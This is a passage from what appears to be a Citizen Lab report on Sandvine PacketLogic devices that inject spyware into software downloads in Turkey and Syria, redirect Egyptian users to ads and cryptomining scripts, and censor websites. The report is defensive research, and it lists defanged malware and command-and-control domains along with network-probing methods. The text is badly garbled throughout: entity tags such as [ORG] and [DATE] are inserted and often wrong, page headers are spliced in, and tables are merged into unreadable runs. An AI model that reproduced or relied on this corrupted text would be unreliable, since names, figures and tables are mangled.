[LAW] 5 , and a [DATE] 2004 forum post by an individual in [GPE] Sweden curious as to why he was seeing [ORG] IPID values of [DATE] 13330 when he tried to ping the [ORG] IP addresses of his website \u2019s visitors with unsolicited [ORG] TCP segments . It is significant in this regard that it was a [NORP] Swedish company , [ORG] Netintact [ORG] AB , founded in [DATE] 2000 , that developed and sold the [ORG] PacketLogic product before [ORG] Procera acquired the company in [DATE] 2006 . [ORDINAL] Third , performing single packet injection in a [ORG] TCP connection is a relatively simple feat to achieve ; an engineer wishing to implement this functionality would likely not need to study or copy another implementation.4 . [GPE] Turkey case : targeted malware injectionThis section describes how DPI equipment that matches our [PERSON] Sandvine [PERSON] PacketLogic fingerprint is used to inject malware to users in [GPE] Turkey and [GPE] Syria who attempt to download common [PRODUCT] Windows software.4.1 . [GPE] Turkey background : information controls and surveillanceIn spite of being a parliamentary democracy with [DATE] decades of multi - party elections , [GPE] Turkey \u2019s government is characterized by corruption , human rights abuses , and autocratic tendencies on the part of the current Prime Minister [PERSON] Recep [PERSON] Tayyip [PERSON] Erdo\u011fan . [GPE] Turkey \u2019s military has traditionally been an important and occasional overbearing presence in domestic politics , with the country experiencing several coup attempts . Information controls played an important part in the most recent such attempt , which was foiled by President [PERSON] Erdo\u011fan in [DATE] July [DATE] 2016 . Prior to the coup attempt , [NORP] Turkish authorities routinely throttled access to prominent social media sites , such as Twitter and Facebook . Erdo\u011fan used Apple \u2019s [ORG] Facetime video calling application during the coup attempt to plead with the [NORP] Turkish public to resist the plotters . While restrictions on social media were softened to facilitate popular opposition to the coup , the openness was short lived , with Internet censorship returning ( and even increasing ) after Erdo\u011fan successfully re - asserted his authority . Although there is widespread and growing popularity of social media in [GPE] Turkey , which provides citizens with an alternative to conservative state - controlled mainstream media , the country has one of the most extensive Internet censorship regimes in the world . ISPs routinely throttle access to popular social media , make frequent requests to service providers to remove content , and even implement occasional regional shutdowns . According to Twitter \u2019s transparency report , [GPE] Turkey led the world with [CARDINAL] 2,710 removalurl\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/12/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?requests in [DATE] the [DATE] first [DATE] six [DATE] months [DATE] of [DATE] 2017 . Although [GPE] Turkey \u2019s numerous security threats , and in particular those related to [NORP] Islamist and other terrorist attacks , are provided as justifications for such expansive controls , Internet censorship has included a broad range of other content such as criticism of the [ORG] Erdo\u011fan regime . The [ORDINAL] first Internet - related legislation in [GPE] Turkey was passed in [DATE] 2007 . It is called \u201c [WORK_OF_ART] Law No . [WORK_OF_ART] 5651 , Regulation of Publications on the Internet and Suppression of Crimes Committed by means of [ORG] Such [ORG] Publications , \u201d or \u201c Internet Law \u201d for short . The Internet Law introduced Internet censorship across a range of content categories and mandated service providers to monitor online content passing through their infrastructure . Additional laws and broader information controls were applied in the aftermath of the [DATE] 2013 Gezi protests , including Law No . 6532 , passed in [DATE] April [DATE] 2014 , which criminalized \u201c the leaking and publication of secret official information , punishable by a prison term of [DATE] up [DATE] to [DATE] nine [DATE] years . \u201d The law authorizes the [NORP] Turkish intelligence agency , [PERSON] Milli [PERSON] \u0130stihbarat [PERSON] Te\u015fkilat\u0131 ( [ORG] MIT ) , to \u201c collect data relating to external intelligence , national defense , terrorism , international crimes and cyber security passing via telecommunication channels . \u201d These laws and practices have imposed strict responsibilities on ISPs to block and disrupt access to targeted URLs ( in some cases through [ORG] DNS poisoning ) , and to monitor and archive Internet traffic for [DATE] two [DATE] years . The responsibilities have , in turn , prompted the acquisition of mass and targeted surveillance technologies . A [DATE] 2014 [PERSON] Citizen [PERSON] Lab report traced activity related to [ORG] Hacking [ORG] Team spyware to an [ORG] IP address owned by [PERSON] T\u00fcrk [PERSON] Telekom , and a [DATE] 2015 report mapped [ORG] FinFisher spyware to [GPE] Turkey . [ORG] MIT \u2019s practical implementation of the [DATE] 2014 national security laws requires the cooperation of the [NORP] Turkish telecommunications sector , which is centralized around T\u00fcrk Telekom . While technically a private company , [PERSON] T\u00fcrk [PERSON] Telekom is heavily controlled by the ruling [ORG] AKP party . The [ORG] AKP exerts influence over [PERSON] T\u00fcrk [PERSON] Telekom through its supposed independent regulator , [ORG] the [ORG] Information [ORG] and [ORG] Communications [ORG] Authority ( which is itself controlled by the state ) , as well as a large ownership stake controlled by the [ORG] Turkish [ORG] Treasury department . The government \u2019s direct influence over [PERSON] T\u00fcrk [PERSON] Telekom was demonstrated following the [DATE] July [DATE] 2016 coup attempt , when several [PERSON] T\u00fcrk [PERSON] Telekom senior executives were purged from the company.4.2 . Localizing the targets of [GPE] Turkey \u2019s malware injectionIn a [DATE] February [DATE] 2018 scan of [GPE] Turkey , we identified [CARDINAL] five different malicious domain names that were injected in response to HTTP requests for [ORG] Opera . We performed traceroutes for the targeted [ORG] IP addresses and found targeting in [CARDINAL] at [CARDINAL] least [CARDINAL] five provinces , based on names we found in the furthest downstream reverse [ORG] DNS ( [ORG] PTR ) record . Figure [CARDINAL] 7 shows the [CARDINAL] five provinces where we identified injection.url\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/13/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?Figure 7 : Locations of the targets of spyware injection in [GPE] Turkey and [GPE] Syria . Over [DATE] five [DATE] months of scanning we found a total of [CARDINAL] 259 targeted [ORG] IP addresses . However , this is not a complete count of targeted [ORG] IP addresses ; we could only measure [ORG] IP addresses that responded to our scans ( i.e. , had an open [NORP] TCP port).We were able to develop a general sense of target identities by scraping data from public router pages hosted on some of the [ORG] IP addresses . The pages show names chosen by the people who set up the routers , including names of users sharing the connection . In some cases , the names chosen were of [NORP] Syrian cities . We conducted on - the - ground testing in [CARDINAL] one such [NORP] Syrian city and found that all users of a particular Internet reseller ( sharing the same T\u00fcrk Telekom IP ) were targeted . We also found several router pages showing names containing \u201c ypg \u201d ( e.g. , ciwan.ypg and ypg - matar ) , indicating possible targeting of [GPE] YPG ( [NORP] Kurdish militia ) members or facilities . We also found that some routers were named for resellers in [GPE] Turkey and [GPE] Syria . We found Facebook pages for some of the named resellers which showed images of the resellers building infrastructure to provide Internet access using [ORG] T\u00fcrk [ORG] Telekom leased lines ( Figures [CARDINAL] 8 and [CARDINAL] 9).url\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/14/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?Figure 8 : [CARDINAL] One [GPE] Turkey - based reseller whose customers appear to be targeted builds atower to beam Internet to border areas in [GPE] Syria \u2019s Afrin region . Figure [CARDINAL] 9 : Images posted by [CARDINAL] one [NORP] Syrian - based reseller in the [ORG] Idlib area whose users appear to be targeted . The reseller appears to redistribute [ORG] T\u00fcrk [ORG] Telekom service viaVDSL in [CARDINAL] one [NORP] Syrian village.url\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/15/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to [PERSON] Af\ufb01liate [PERSON] Ads?After we sent letters to [GPE] Sandvine and Francisco Partners on [DATE] February [DATE] 12 , [DATE] 2018 , we ran tests on [DATE] February [DATE] 14 [DATE] and [DATE] February [DATE] 16 , [DATE] 2018 which found that [CARDINAL] two targeted [ORG] IP addresses \u2013 on which we had observed injection since [DATE] October [DATE] 2017 \u2013 no longer produced injection . We conducted a full scan of [GPE] Turkey on [DATE] March [DATE] 7 , [DATE] 2018 and found that these [CARDINAL] two [ORG] IP addresses again produced injection , but with different domain names . Our [DATE] March scan also found that the operators of the injection had changed some of the injected domain names . Malware domain ( Feb- ruary [CARDINAL] 2018)solitude.file- download[.]todayMalware domain ( March 2018)system.filedownloaders[.]comInjection locationHataysystem.documentations[.]liveepoch.englishdownloaders[.]todayGaziantepepiphany.download- document[.]worldepiphany.download - document[.]world [PERSON] Ankara ( Ulusquarter)epoch.wind - files[.]todaydocument.downloadingsystem[.]comAdanainternet.document- management[.]todayinternet.downloadingdocuments[.]com [PERSON] Diyarbakir4.3 . Identifying targeted applicationsWe performed testing of targeted [ORG] IP addresses to see what additional applications were being targeted . We sent requests like the one in Figure [CARDINAL] 10 for a variety of paths and filenames matching popular [PRODUCT] Windows software . We tested filenames associated with the IOCs from [CARDINAL] two earlier reports , as well as the top [CARDINAL] 20 Windows applications on [ORG] Download.com ( [CARDINAL] one of the IOCs from previous reports pointed to a file called avast_free_antivirus_setup_online_cnet1.exe).GET [ path ] HTTP/1.1 Connection : closeFigure [CARDINAL] 10 : Form of requests that we sent to test for targeted applications . We found [CARDINAL] at [CARDINAL] least [CARDINAL] ten applications whose downloads were targeted for spyware injection . Figure [CARDINAL] 11 lists the targeted applications we found , and for each application , a non- exhaustive list of websites where targeted users \u2019 downloads of these applications would be injected with spyware.url\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/16/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?Path / opera / stable / windows / vlc-2.2.8 - win32.exe / ccsetup539.exe / wrar550.exe / wrar540tr.exe / winrar - x64 - 550.exe / winrar - x64 - 550tr.exe/7z1701.exe/7z1701 - x64.exeWhich ap- Turkish7 - Zip7 - Zip ( 64- bit)If a user visits this site to download the application , the path will be fetched unauthenticated over HTTPopera.comdownload.videolan.org 8ccleaner.com download.comdownload.com?download.com?7-zip.org7-zip.org/avast_free_antivirus_setup_online.exe download.com/driver_booster_setup.exe/SkypeSetup.exe/advanced-systemcare-setup.exeDriver BoosterSkypeiobit.comdownload.comAdvanced SystemCareiobit.comFigure [CARDINAL] 11 : Applications targeted for spyware injection in [GPE] Turkey . Some of these websites supported [ORG] HTTPS , but did not redirect users to the [ORG] HTTPS version when directly visited . As an example , when a user visited opera.com ( the unencrypted version ) , they were not redirected to the [ORG] HTTPS - encrypted version automatically . According to Internet Archive data , [ORG] Opera seems to have fixed the issue onurl\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/17/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to [ORG] Af\ufb01liate [ORG] Ads?March [DATE] 7 , [DATE] 2018 , between [PRODUCT] 07:26GMT and [CARDINAL] 16:04GMT . Surprisingly , some websites we tested , like avast.com , iobit.com , and ccleaner.com , used HTTPS on their main website but directed users to download links that did not use [ORG] HTTPS . While the user saw an HTTPS page in their browser , the file that the page downloaded to their computer was via HTTP ( Figure [CARDINAL] 12 ) . Targeted users in [GPE] Turkey and [GPE] Syria would have received spyware instead of the legitimate version of the app . Sometime after [DATE] February [DATE] 13 , [DATE] 2018 , Avast fixed [CARDINAL] one page on their avast.com site to use HTTPS for downloads . However , as of the publication date of this report , another page on avast.com redirects users to an insecure download on download.com . Piriform fixed their ccleaner.com site to use HTTPS for downloads sometime after [DATE] February 23 , [DATE] 2018 . Also , as of the date of publication , some websites we list in Figure [CARDINAL] 11 do not appear to support HTTPS at all , including download.com , [CARDINAL] 7 - zip.org.9Figure [CARDINAL] 12 : The [LOC] Avast website in [DATE] February [DATE] 2018 , showing an [ORG] HTTPS padlock while automatically starting an insecure file download . The lack of HTTPS on the filedownload means that targeted users in [GPE] Turkey and [GPE] Syria will instead receive spyware . Avast fixed this particular issue in [DATE] late [DATE] February 2018.This situation can be particularly problematic for activists who may rely on advice to use apps like CCleaner and Avast . For example , the digital security guide Security in a Box advises the use of both products and links to the official websites of these products , both of which offered insecure downloads.4.4 . Connection with [ORG] FinFisher campaignVirusTotal records that a sample of StrongPity - like spyware communicating with updserv - east - cdn3[.]com was downloaded from download.downloading[.]shop , the same site used to distribute samples of [ORG] FinFisher . The updserv - east - cdn3[.]com server was alsourl\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/18/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?the command and control ( [ORG] C&C ) server for the samples of StrongPity - like spyware downloaded in a subsequent phase of the injection campaign that we observed , from sites including downloading[.]internetdownloading[.]co and downloading[.]syriantelecom[.]co.5 . AdHose : Mass connection hijacking to deliver affiliate ads in [LOC] EgyptThis section describes how DPI equipment that matches our [PERSON] Sandvine [PERSON] PacketLogic fingerprint is installed on Telecom Egypt \u2019s network at [GPE] Egypt \u2019s borders , and is used to deliver affiliate ads , cryptocurrency mining scripts , and perhaps nation - state spyware , to [NORP] Egyptian Internet users.5.1 . [GPE] Egypt background : malware , surveillance , and [DATE] censorshipSeven [DATE] years after the [DATE] 2011 demonstrations in [GPE] Cairo \u2019s [FAC] Tahrir [FAC] Square , [NORP] Egyptian President [PERSON] Abdel [PERSON] Fattah el - Sisi has escalated a violent crackdown against opposition and dissent . Under the guise of combating terrorism , particularly following a series of [ORG] ISIS church bombings , the el - Sisi government has engaged in mass arrests , forced disappearances , and torture against targeted journalists , human rights defenders , and protesters . The brief window opened during [EVENT] the [EVENT] Arab [EVENT] Spring period has closed as el - Sisi has sought to strengthen his rule and silence critics of his regime . The [NORP] Egyptian government has been widely criticized for its human rights abuses and corruption . A [DATE] May [DATE] 2017 law ratified by el - Sisi was criticized as stifling dissent as it imposes new restrictions on foreign NGOs , subjects groups to additional security monitoring and financial reporting requirements , and imposes heavy fines on groups who publish without government permission . Reporters Without Borders has ranked Egypt 161st out of the [CARDINAL] 180 countries it included in its [CARDINAL] 2017 [EVENT] World [EVENT] Press [EVENT] Freedom Index . [CARDINAL] More [CARDINAL] than [CARDINAL] 15,000 civilians have been tried in military courts since [DATE] 2014 , and [CARDINAL] more [CARDINAL] than [CARDINAL] 800 people have been sentenced to death since [DATE] 2013 . Corruption is also endemic across all of society in [GPE] Egypt , in spite of numerous attempts by various government agencies to reign it in . [ORG] Transparency [ORG] International ranked [GPE] Egypt [CARDINAL] 108 out of [CARDINAL] 176 countries in its 2016 Corruption Perceptions Index . [GPE] Egypt adopted a new constitution following a [DATE] January [DATE] 2014 referendum . While the revised constitution does contain provisions protecting freedom of expression , access to information , and freedom of the press , it also contains exceptions which allow censorship during periods of war or state of emergency . Prior to the [DATE] 2011 Arab Spring , [GPE] Egypt had generally been under a continuous state of emergency since [DATE] 1958 . Following a short reprieve in [DATE] 2012 , successive [NORP] Egyptian governments have repeatedly reimposed emergency rule , and most recently in [DATE] January [DATE] 2018 . Such declarations expand the arrest and detention powers of security forces and permit media censorship . El - Sisi has also targeted the country \u2019s judiciary by ratifying a bill which empowers him to select the courts \u2019 chiefurl\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/19/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?justices . Several potential political candidates have been arrested or face intimidation and physical violence in advance of the [DATE] March [DATE] 2018 Presidential election . The election , which is virtually guaranteed to see el - Sisi elected to a [ORDINAL] second term , has been widely criticized as undemocratic . Telecommunications surveillance is facilitated under the 2003 [EVENT] Telecommunications [EVENT] Regulation [EVENT] Law . This law compels telecommunications operators to provide technical capacity for the military and national security entities to \u201c exercise their powers within the law \u201d as well as prohibiting the use of \u201c telecommunication services encryption equipment \u201d without written authorization from entities including the armed forces . [LAW] Article [LAW] 73 [LAW] of the Telecommunications Law prohibits telecommunications providers from interfering with any part of a telecommunication message . The ongoing crackdown against critical voices has extended to online censorship . The pre - Arab Spring [PERSON] Mubarak government did not engage in widespread online censorship . However reports of censorship have increased in [DATE] recent [DATE] years . Testing conducted by the [ORG] OONI project in [DATE] 2016 confirmed reporting that [NORP] Qatari - owned news website [WORK_OF_ART] The [WORK_OF_ART] New [WORK_OF_ART] Arab and its [LANGUAGE] Arabic language version were blocked . Censorship in [GPE] Egypt has also reflected regional concerns . [GPE] Egypt , and [CARDINAL] four other [NORP] Arab states including [GPE] Saudi [GPE] Arabia , have accused [GPE] Qatar of supporting terrorism and destabilizing the region . In response , [GPE] Egypt was reported in [DATE] May [DATE] 2017 to have blocked access to [CARDINAL] 21 news websites for \u201c supporting terrorism and spreading false news \u201d . The blocked websites included [GPE] Qatar - based [ORG] Al [ORG] Jazeera as well as prominent local independent news website [PERSON] Mada [PERSON] Masr . In [DATE] September [DATE] 2017 [GPE] Egypt blocked [ORG] the [ORG] Human [ORG] Rights [ORG] Watch website [DATE] one [DATE] day after [ORG] HRW released a report documenting the use of torture by the country \u2019s security services . The use of surveillance technology by the [NORP] Egyptian government has been widely documented , particularly the technologies operated by an obscure intelligence agency called [ORG] the [ORG] Technical [ORG] Research [ORG] Department ( TRD ) . A [DATE] 2015 [PERSON] Citizen [PERSON] Lab report identified that a server used in the operation of [ORG] FinFisher surveillance malware was present on networks operated by the TRD . Similarly , Privacy International obtained documents leaked from [ORG] Nokia [ORG] Siemens [ORG] Networks which showed that the company sold an interception management system and monitoring centre to the [ORG] TRD . The leaked emails from surveillance company [ORG] Hacking [ORG] Team indicated that the company had sold its surveillance malware system to the TRD for [CARDINAL] more [CARDINAL] than [CARDINAL] 1 [CARDINAL] million Euros . A [DATE] 2017 [ORG] Citizen Lab report documented a large - scale phishing campaign against [NORP] Egyptian civil society members . Virtually all of the targets identified in this report were implicated in Case [CARDINAL] 173 , a legal case brought by the [NORP] Egyptian government against domestic NGOs . In this case , the government has accused NGOs of improperly receiving foreign funding and engaging in prohibited activities.5.2 . Following up on earlier findingsurl\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/20/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to [ORG] Af\ufb01liate Ads?A September [DATE] 2017 report found [ORG] FinFisher spyware injected via [LAW] HTTP [LAW] 307 redirect matching the format in Figure [CARDINAL] 1 using the URL url records the sample as being downloaded from that it was running [ORG] cPanel , and the email address associated with the [ORG] cPanel installation was an email address we know to be associated with the [ORG] TRD based on past work the Citizen Lab has conducted . We conducted Internet scanning of [GPE] Egypt , sending every IPv4 address an HTTP request to download the [ORG] TrueCrypt setup file , but did not find any spyware injection . However , we discovered a system we call AdHose that was redirecting [NORP] Egyptian Internet users to affiliate ads and cryptocurrency mining scripts . Figure [CARDINAL] 13 : Diagram of how AdHose seems to work in [GPE] Egypt . We identify [CARDINAL] two modes of [ORG] AdHose . In spray mode , a middlebox redirects [NORP] Egyptian Internet users en masse to ads or cryptocurrency mining scripts whenever they make a request to any website . In trickle mode , only requests to certain URLs are redirected . It appears that spray mode is enabled sparingly , whereas trickle mode appears to be in operation mostly continuously.url\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/21/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to [ORG] Af\ufb01liate Ads?5.3 . Discovering AdHose When checking Shodan for HTTP [CARDINAL] 307 redirects ( [LAW] Section [LAW] 3.2 ) , we noticed a large number of redirects returned by [NORP] Egyptian IPs to what appeared to be an advertising site ( Figure [CARDINAL] 14 ) . The site embedded further redirects to affiliate ads . [PRODUCT] HTTP/1.1 [PRODUCT] 307 [PRODUCT] Temporary [PRODUCT] Redirect [PRODUCT] Location : url Connection : closeFigure [CARDINAL] 14 : Suspicious HTTP redirect returned by [NORP] Egyptian IPs . While we were conducting an ( unrelated ) scan of the IPv4 Internet ( from outside [GPE] Egypt ) , we captured these redirects being injected , solely for [ORG] IP addresses in [GPE] Egypt . The redirects were injected during [TIME] 32 [TIME] minutes of our scan ( on [DATE] January [DATE] 8 , [DATE] 2018 between 10:23:36 \u2013 10:55:12 [GPE] Egypt time ) . The advertising redirects were injected in response to requests we sent of the form in Figure [CARDINAL] 15 ( where \u201c % s \u201d is the [ORG] IP address we were scanning).GET / HTTP/1.1 Host : % s User - Agent : Mozilla/5.0Figure [CARDINAL] 15 : HTTP request sent by our scan that elicited ad injection . The PCAPs we recorded during our scan show that each instance of injection matches our entire fingerprint in [LAW] Section [LAW] 3.3 . Namely , all injected packets have [ORG] IPID = [DATE] 13330 , no [ORG] IP flags , match the expected [CARDINAL] 307 Redirect format , and involve the packet injector sending an unsolicited final [ORG] ACK packet ~100ms after injecting the redirect . This indicates that the redirect was likely being injected by [PERSON] Sandvine [PERSON] PacketLogic devices as configured by the operators . During [TIME] the [TIME] 32 [TIME] minutes on [DATE] January [DATE] 8 when injection was active , we both scanned and received a response containing data from [CARDINAL] 3,337 [ORG] IP addresses in [CARDINAL] 27 ASNs in [GPE] Egypt ( as determined by [NORP] MaxMind GeoLite2 country database ) . [CARDINAL] 1,239 [ORG] IP addresses in [CARDINAL] 17 ASNs returned the advertising redirect , for an injection rate of ~38 % . This appears to be an instance of the [ORG] AdHose spray mode . Figure [CARDINAL] 16 shows the ASNs in which we observed injections , indicating that the middleboxes used for injection are upstream from these ASNs.url\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/22/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to [ORG] Af\ufb01liate Ads?ASN # [ORG] ASN Description24863Link [GPE] Egypt ( Link . NET)8452Telecom [GPE] Egypt ( TE)20928Noor36992Etisalat Misr24835Vodafone / Raya Telecom37031 Misr Information Services & Trading ( MIST)36935Vodafone37069 Mobinil33785City Net Telecom30993Egypt [PRODUCT] Centers20484Yalla [PRODUCT] Online36408CDNetworks328067 EGIT31619310652557615475City StarsEgyptian Ministry of Communications and Information Technology ( MCIT)Armed [ORG] Forces [ORG] Main information [PERSON] Center ( AFMIC)Nile Online ( NOL)Figure [CARDINAL] 16 : ASNs where we observed injection in Egypt.5.4 . A multi - year campaignOONI \u2019s report and dataOur data matches up with findings that the network interference measurement project OONI published in [DATE] August [DATE] 2016 . OONI \u2019s work revealed affiliate ad injection when users attempted to access certain pornography websites in [GPE] Egypt . OONI \u2019s findings matched all elements of the fingerprint we described in [LAW] Section [LAW] 3.3 , which suggests that the ad injection they identified in [DATE] 2016 was also the result of [ORG] Sandvine [ORG] PacketLogic devices as configured by the operators.url\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/23/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?Additional historical OONI data that we reviewed showed evidence that [CARDINAL] two domains , [ORG] copticpope[.]org ( the former website of the Pope of [ORG] the [ORG] Coptic [ORG] Orthodox [ORG] Church [ORG] of [ORG] Alexandria ) and babylon - x[.]com ( a former pornographic website ) , have been targeted by [ORG] AdHose in trickle mode . As a result , visitors to these websites were continuously redirected to ads , regardless of whether spray mode was active . We confirmed these findings in our own scans in [DATE] February [DATE] 2018 . We also identified an [DATE] October [DATE] 2016 post on Webhostingtalk which indicated that visitors to a free web counter [ORG] JavaScript file , url were redirected to advertisements linked to the infinitads[.]com domain . We tested accessing this URL from within [GPE] Egypt and found that it is targeted by [ORG] AdHose in trickle mode . [ORG] Censys captures [ORG] AdHose sprayWe found that the [DATE] 7547 - cwmp - get - full_ipv4 [ORG] Censys scan performed on [DATE] January [DATE] 3 , [DATE] 2018 captured AdHose in spray mode [TIME] between [TIME] 15:50:23 [TIME] \u2013 [TIME] 16:32:02 local time . [ORG] Censys both scanned and received a response containing data from [CARDINAL] 5,702 [ORG] IP addresses in [CARDINAL] four ASNs in [GPE] Egypt during this period . Of these [CARDINAL] 5,702 IPs , [CARDINAL] 5,443 in [CARDINAL] four ASNs returned the advertising redirect , for an injection rate of ~95%.10Enumerating affiliate IDsWe looked at historical OONI data and enumerated all HTTP [CARDINAL] 307 redirects within [GPE] Egypt that did not match the domain from which they were redirected . Within this list , we looked for any domains returned which appeared to be domains hosting advertising pages ( for example , we manually filtered out domains that appeared to be [ORG] ISP or billing notifications ) . To this list , we added the injected domains that OONI previously reported . We then gathered all copies of all pages on these domains archived by [ORG] the [ORG] Internet [ORG] Archive , and looked for affiliate links included in the HTML source of the webpages ( or any pages they redirected to ) . We also manually visited URLs in cases where the Internet Archive did not retain past copies . As a result of this process , we obtained the list of affiliate links and IDs we believe were used by the [ORG] AdHose operators , shown in Figure [CARDINAL] 17.url\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/24/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to [ORG] Af\ufb01liate [ORG] Ads?Affiliate [ORG] IDs723454 work Affiliate LinkAdver- Ltd.url zoneid=1251527 url id=1209127url id=773263url id=896707url id=723454url Corpurl url tica.aeurl section = General&pub=175258&ga = g url section = General&pub=125652&ga = g125652 fied)url zoneId=2692073&htatb=1&sId=26920732692073url\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/25/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to [PERSON] Af\ufb01liate [PERSON] Ads?Ad Net- work [ORG] Affiliate [ORG] LinkAffiliate IDsurl ing)Figure [CARDINAL] 17 : Affiliate links we believe were used by [ORG] AdHose operators . We saw a significant overlap between the ad networks mentioned in the OONI report and [ORG] AdHose . For example , we saw in the hosting history that static.dbmads[.]com forwarded users to ad2upapp[.]com , which was mentioned in the initial OONI report . Additionally , the infinitads[.]com domain mentioned in the OONI report was forwarded to static.dbmads[.]com at several points in time . This overlap suggests to us that the same actors have been involved since [DATE] at [DATE] least [DATE] October [DATE] 2016.5.5 . Localizing [GPE] Egypt \u2019s middleboxesWe conducted tests that localized the [ORG] AdHose middleboxes to a [ORG] Telecom [ORG] Egypt demarcation point . We noticed that for [ORG] AdHose , the redirects were injected upon receipt of an HTTP response , rather than an HTTP request . In this case , sending a request to a server did not trigger an injected response unless the server received the request , and returned a proper HTTP response . We verified that we could configure our [ORDINAL] second - hand [PRODUCT] PacketLogic device to inject on responses rather than requests , such as by adding a condition on the injection rule that would not be known until the device saw the response ( e.g. , the condition \u201c HTTP response code = = 200\u201d).Test [CARDINAL] 1 : localizing AdHoseBecause AdHose only injects data in response to HTTP responses , sending [ORG] TTL limited HTTP requests can not localize AdHose . We instead sent a [ORG] TTL - limited [ORG] FIN / ACK packet after properly establishing a [ORG] TCP connection , but before sending a default - TTL HTTP request with a Host header for [CARDINAL] one of the AdHose domains ( copticpope[.]org ) . By varying the [ORG] TTL of the [ORG] FIN / [ORG] ACK packet , we could identify the link on which the middlebox [ORDINAL] first saw the FIN / ACK ( and the end - host in [GPE] Egypt did not ) . We hypothesized that when the middlebox [ORDINAL] first saw the FIN / [ORG] ACK , it might consider the connection closed and noturl\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/26/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?perform any injection on the server \u2019s response . Thus , we would expect to find some number X , where setting the [ORG] TTL to Y ( [PERSON] \u2265 [PERSON] X ) would cause us to receive the legitimate response from the server , and setting the [ORG] TTL to Z ( < X ) would cause us to receive the redirect injected by [PERSON] AdHose . We did indeed observe this behavior ; the [ORDINAL] first link on which we saw the legitimate response from the end - host in [GPE] Egypt ( and not the injected response ) was between [ORG] egypt.demarc.cogentco.com ) , which appears to be a cable link between [GPE] Marseilles , [GPE] France , and [GPE] Egypt . Test [CARDINAL] 2 : localizing censorshipIn this test , we found that the same device that was running [PERSON] AdHose was also performing Internet censorship in [GPE] Egypt . We localized the censorship functionality of the device by sending a [ORG] TTL - limited HTTP request to a blocked website ( www.aljazeera.net ) . By varying the [ORG] TTL of the HTTP request , and observing whether we received an injected [ORG] egypt.demarc.cogentco.com ) , which appears to be the same cable link that we found in Test 1.Given that we localized both [PERSON] AdHose and Internet censorship to the same link , we believe that the same [ORG] PacketLogic device is being used to carry out both functionalities.6 . [ORG] Egypt [ORG] & [ORG] Turkey [ORG] Censorship TestingThis section describes how DPI equipment that matches our [PERSON] Sandvine [PERSON] PacketLogic fingerprint is blocking political and human rights content in [GPE] Egypt and Turkey.6.1 . Websites blockedIn [GPE] Egypt , we found that devices matching our [PERSON] Sandvine [PERSON] PacketLogic fingerprint are being used to block [CARDINAL] dozens of human rights , political , and news websites including [ORG] Human [ORG] Rights [ORG] Watch , Reporters Without Borders , [ORG] Al [ORG] Jazeera , [PERSON] Mada [PERSON] Masr , and HuffPost Arabi . In [GPE] Turkey , we discovered that these devices are being used to block websites including every language version of [ORG] Wikipedia , the website of [ORG] the [ORG] Dutch [ORG] Broadcast [ORG] Foundation ( [ORG] NOS ) , and the website of the [ORG] PKK ( [ORG] Kurdistan [ORG] Workers \u2019 Party).The blocking is implemented by injecting [ORG] TCP reset packets . The 